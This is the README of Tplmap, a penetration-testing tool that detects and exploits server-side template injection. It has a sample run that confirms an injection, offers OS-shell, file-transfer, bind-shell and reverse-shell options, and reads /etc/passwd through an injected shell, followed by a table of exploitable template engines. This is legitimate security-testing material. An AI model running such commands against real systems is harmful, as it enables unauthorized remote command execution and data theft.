Tplmap
======

Tplmap (short for _Template Mapper_) is a tool that automate the process of detecting and exploiting Server-Side Template Injection vulnerabilities (SSTI). This assists SSTI exploitation to compromise the application and achieve remote command execution on the operating system. 

The tool can be used by security researchers and penetration testers, to detect and exploit vulnerabilities and study the template injection vulnerability class.

The plugin architecture makes easy to extend the tool and support new template engines and sandbox break-out techniques. Part of the implemented techniques came from public research papers as James Kett's [Server-Side Template Injection: RCE For The Modern Web App][1] and other [works][4] while others have been [discovered][2] to [extend][3] this tool exploitation capabilities. 

Tplmap is able to detect and achieve arbitrary command execution in several scenarios as injections in code context and blind injections. The tool also detects code injections in several languages (e.g. Server-Side JavaScript Injection) exploiting _eval()_-like injections and generic template engines accepting arbitrary code.

Example
-------

```
$ ./tplmap.py -u 'http://www.target.com/app?id=7'
[+] Tplmap 0.2
    Automatic Server-Side Template Injection Detection and Exploitation Tool

[+] Testing if GET parameter 'id' is injectable
[+] Smarty plugin is testing rendering with tag '{*}'
[+] Smarty plugin is testing blind injection
[+] Mako plugin is testing rendering with tag '${*}'
...
[+] Jade plugin is testing rendering with tag '\n= *\n'
[+] Jade plugin has confirmed injection with tag '\n= *\n'
[+] Tplmap identified the following injection point:

  GET parameter: id
  Engine: Jade
  Injection: \n= *\n
  Context: text
  OS: darwin
  Technique: render
  Capabilities:

   Code evaluation: yes, javascript code
   Shell command execution: yes
   File write: yes
   File read: yes
   Bind and reverse shell: yes

[+] Rerun tplmap providing one of the following options:

    --os-shell or --os-cmd to execute shell commands via the injection
    --upload LOCAL REMOTE to upload files to the server
    --download REMOTE LOCAL to download remote files
    --bind-shell PORT to bind a shell on a port and connect to it
    --reverse-shell HOST PORT to run a shell back to the attacker's HOST PORT
          
$ ./tplmap.py -u 'http://www.target.com/app?id=7' --os-shell

[+] Run commands on the operating system.

linux $ whoami
www-data
linux $ ls -al /etc/passwd
-rw-r--r--  1 root  wheel  5925 16 Sep  2015 /etc/passwd
linux $

```

Supported template engines
--------------------------

| Template engine      | Techniques         | Command execution | Code evaluation | File read | File write |
|----------------------|--------------------|-------------------|-----------------|-----------|------------|
| Mako                 |  render/blind      | yes               | Python          | yes       | yes        |
| Jinja2               |  render/blind      | yes               | Python          | yes       | yes        |
| Python (generic)     |  render/blind      | yes               | Python          | yes       | yes        |
| Nunjucks             |  render/blind      | yes               | JavaScript      | yes       | yes        |
| Jade                 |  render/blind      | yes               | JavaScript      | yes       | yes        |
| doT                  |  render/blind      | yes               | JavaScript      | yes       | yes        |
| Marko                |  render/blind      | yes               | JavaScript      | yes       | yes        |
| JavaScript (generic) |  render/blind      | yes               | JavaScript      | yes       | yes        |
| Dust (<= dustjs-helpers@1.5.0) |  render/blind      | yes               | JavaScript      | yes       | yes        |
| Smarty (unsecured)   |  render/blind      | yes               | PHP             | yes       | yes        |
| PHP (generic)        |  render/blind      | yes               | PHP             | yes       | yes        |
| Freemarker           |  render/blind      | yes               | no              | yes       | yes        |
| Velocity             |  render/blind      | yes               | no              | yes       | yes        |
| Twig                 |  render            | no                | no              | no        | no         |
| Smarty (secured)     |  render            | no                | no              | no        | no         |
| Dust (> dustjs-helpers@1.5.0)  |  render            | no                | no              | no        | no         |

[1]: http://blog.portswigger.net/2015/08/server-side-template-injection.html
[2]: https://github.com/epinna/tplmap/issues/9
[3]: http://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine
[4]: https://artsploit.blogspot.co.uk/2016/08/pprce2.html
